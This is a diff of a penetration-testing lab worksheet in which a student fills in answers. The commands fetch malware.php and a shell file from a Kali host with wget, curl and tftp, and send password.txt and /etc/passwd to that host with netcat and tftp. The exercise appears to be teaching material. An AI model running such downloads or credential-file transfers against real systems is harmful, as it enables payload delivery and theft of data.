@@ -206,15 +206,16 @@ tftp 191.168.0.101 <<< "get shell5555.php shell5555.php"
     python3 -m http.server 5000
     ````
 2. On your student machine, download the malware.txt file with the wget command.
-    > Your command :
+    > Your command : wget http://<KALI_IP>:5000/malware.php
 
 3. On your Student machine, download the malware.txt file with the cURL command.
-    > Your command :
+    > Your command : curl http://<KALI_IP>:5000/malware.php -o malware.php
 
 4. On the student machine, create a file named password.txt and transfer it to your kali machine with netcat
-    > Your commands
+    > Your commands : On Kali (listening for the file):  nc -lvp 1234 > password.txt | 
+    On the student machine (sending the file): nc <KALI_IP> 1234 < password.txt
 
 5. On the student machine,  transfer ``/etc/passwd`` file to your kali machine with tftp
-    > your commands
+    > your commands tftp <KALI_IP> --> put /etc/passwd --> quit | cp /etc/passwd /tmp/passwd --> tftp <KALI_IP> --> put /tmp/passwd --> quit
 
 
